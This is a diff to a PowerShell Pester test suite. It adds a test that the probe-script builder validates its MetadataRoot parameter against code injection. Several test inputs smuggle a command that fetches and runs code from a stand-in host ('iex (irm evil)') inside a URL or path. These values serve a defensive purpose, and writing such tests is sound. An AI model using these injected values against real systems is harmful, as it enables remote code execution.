@@ -1077,6 +1077,18 @@ Describe 'probe literal safety' {
             Should -Throw -ExpectedMessage '*interpolated as code*'
     }
 
+    # MetadataRoot is a parameter like the rest, and "no caller overrides it
+    # today" is a property of the callers, not of the function. The contract
+    # this guard states is that EVERY interpolated value is validated.
+    It 'validates the metadata root it was handed, not just the ones from metadata' {
+        Test-ProbeLiteral -Value 'http://169.254.169.254/computeMetadata/v1' -Kind 'url' | Should -BeTrue
+        Test-ProbeLiteral -Value "http://h/v1'; iex (irm evil); '" -Kind 'url' | Should -BeFalse
+        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
+                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' `
+                -MetadataRoot "http://h/v1'; iex (irm evil); '" } |
+            Should -Throw -ExpectedMessage '*interpolated as code*'
+    }
+
     It 'refuses to build a payload from an injected path' {
         { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
                 -SiblingWorkspace "C:\s2'; iex (irm evil); '" -CacheRoot 'C:\s1' } |
